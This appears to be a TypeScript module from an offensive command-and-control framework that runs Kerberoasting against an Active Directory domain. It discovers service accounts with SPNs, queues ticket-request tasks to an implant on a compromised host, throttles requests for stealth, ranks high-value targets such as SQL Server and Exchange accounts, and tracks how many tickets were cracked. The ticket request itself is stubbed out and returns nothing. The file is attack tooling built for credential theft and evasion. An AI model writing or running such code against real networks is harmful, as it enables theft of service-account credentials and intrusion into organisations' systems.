import { PrismaClient } from '@prisma/client';
import { KerberosUtils, KerberosTicketData, SPNTarget } from './kerberos-utils';
import logger from '../../logger';

const prisma = new PrismaClient();

export interface KerberoastingRequest {
  sourceHostId: string;
  targetDomain: string;
  targetAccounts?: string[];
  allKerberoastable?: boolean;
  options?: {
    requestThrottle?: number; // milliseconds between requests
    randomUserAgent?: boolean;
    maxTickets?: number;
  };
}

export interface KerberoastingResult {
  success: boolean;
  ticketsCollected: number;
  tickets: KerberosTicketData[];
  failedAccounts: string[];
  executionTime: number;
  error?: string;
}

export class KerberoastingExecution {
  private defaultOptions = {
    requestThrottle: 5000, // 5 seconds between requests
    randomUserAgent: true,
    maxTickets: 100
  };

  async execute(request: KerberoastingRequest): Promise<KerberoastingResult> {
    const startTime = Date.now();
    logger.info(`Starting Kerberoasting attack on domain ${request.targetDomain}`);

    try {
      const options = { ...this.defaultOptions, ...request.options };
      const tickets: KerberosTicketData[] = [];
      const failedAccounts: string[] = [];

      // Discover kerberoastable SPNs
      let targets: SPNTarget[];
      if (request.allKerberoastable || !request.targetAccounts) {
        targets = await KerberosUtils.discoverKerberoastableSPNs(
          request.targetDomain,
          request.sourceHostId
        );
      } else {
        // Filter to specific accounts
        const allTargets = await KerberosUtils.discoverKerberoastableSPNs(
          request.targetDomain,
          request.sourceHostId
        );
        targets = allTargets.filter(t => request.targetAccounts!.includes(t.accountName));
      }

      logger.info(`Found ${targets.length} kerberoastable targets`);

      // Apply max tickets limit
      if (options.maxTickets && targets.length > options.maxTickets) {
        targets = targets.slice(0, options.maxTickets);
        logger.info(`Limited to ${options.maxTickets} targets`);
      }

      // Request TGS tickets for each target
      for (let i = 0; i < targets.length; i++) {
        const target = targets[i];

        try {
          // Apply throttle for OPSEC
          if (i > 0 && options.requestThrottle) {
            await this.sleep(options.requestThrottle);
          }

          const ticket = await this.requestTGSTicket(target, request.sourceHostId);
          if (ticket) {
            tickets.push(ticket);
            logger.info(`Successfully collected ticket for ${target.accountName}`);
          } else {
            failedAccounts.push(target.accountName);
            logger.warn(`Failed to collect ticket for ${target.accountName}`);
          }
        } catch (error) {
          failedAccounts.push(target.accountName);
          logger.error(`Error collecting ticket for ${target.accountName}:`, error);
        }
      }

      // Store tickets in database
      for (const ticket of tickets) {
        await KerberosUtils.storeTicket(ticket);
      }

      const executionTime = Date.now() - startTime;
      logger.info(`Kerberoasting attack completed: ${tickets.length} tickets collected in ${executionTime}ms`);

      return {
        success: true,
        ticketsCollected: tickets.length,
        tickets,
        failedAccounts,
        executionTime
      };
    } catch (error) {
      const executionTime = Date.now() - startTime;
      logger.error('Kerberoasting attack failed:', error);

      return {
        success: false,
        ticketsCollected: 0,
        tickets: [],
        failedAccounts: [],
        executionTime,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }

  private async requestTGSTicket(
    target: SPNTarget,
    sourceHostId: string
  ): Promise<KerberosTicketData | null> {
    try {
      // This would integrate with implant to request TGS ticket
      // For now, simulate ticket collection

      // Create implant task for TGS request
      const implant = await prisma.compromisedHost.findUnique({
        where: { id: sourceHostId }
      });

      if (!implant || !implant.implantId) {
        throw new Error('Source host has no implant');
      }

      await prisma.implantTask.create({
        data: {
          implantId: implant.implantId,
          taskId: `kerberoast-${Date.now()}`,
          type: 'kerberoast',
          args: {
            targetAccount: target.accountName,
            spn: target.spn,
            domain: target.serviceType
          },
          status: 'pending'
        }
      });

      // TGS ticket extraction requires an active implant with Kerberos capabilities
      logger.warn(`TGS ticket extraction for ${target.accountName} requires active implant response`);
      return null;
    } catch (error) {
      logger.error(`Failed to request TGS ticket for ${target.accountName}:`, error);
      return null;
    }
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Get high-value targets for kerberoasting
   */
  async getHighValueTargets(domain: string): Promise<SPNTarget[]> {
    const targets = await KerberosUtils.discoverKerberoastableSPNs(domain);

    // Prioritize high-privilege service accounts
    const highValueServiceTypes = [
      'MSSQLSvc',      // SQL Server
      'HTTP',          // Web servers
      'cifs',          // File shares
      'HOST',          // Domain controllers
      'exchangeMDB'    // Exchange
    ];

    return targets
      .filter(t => highValueServiceTypes.includes(t.serviceType))
      .sort((a, b) => {
        // Sort by privilege level
        const priority = { 'service': 3, 'admin': 2, 'user': 1 };
        return priority[b.privilegeLevel as keyof typeof priority] - priority[a.privilegeLevel as keyof typeof priority];
      });
  }

  /**
   * Get kerberoasting statistics
   */
  async getStatistics(domain?: string): Promise<{
    totalTargets: number;
    kerberoastable: number;
    ticketsCollected: number;
    ticketsCracked: number;
    successRate: number;
  }> {
    const targets = await KerberosUtils.discoverKerberoastableSPNs(domain);
    const report = await KerberosUtils.generateTicketReport(domain);

    const successRate = report.total > 0 ? (report.cracked / report.total) * 100 : 0;

    return {
      totalTargets: targets.length,
      kerberoastable: targets.filter(t => t.isKerberoastable).length,
      ticketsCollected: report.total,
      ticketsCracked: report.cracked,
      successRate
    };
  }
}

// Singleton instance
export const kerberoastingExecution = new KerberoastingExecution();